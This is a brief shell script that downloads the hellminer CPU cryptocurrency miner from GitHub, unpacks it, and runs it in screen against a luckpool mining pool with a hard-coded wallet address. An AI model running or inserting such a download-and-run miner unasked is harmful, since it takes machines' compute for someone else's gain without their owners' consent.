sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
screen ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RGYq5yuc7uFVjuShk6jWq2DBCCtKhe1a2e.bitbit -p x --cpu 4

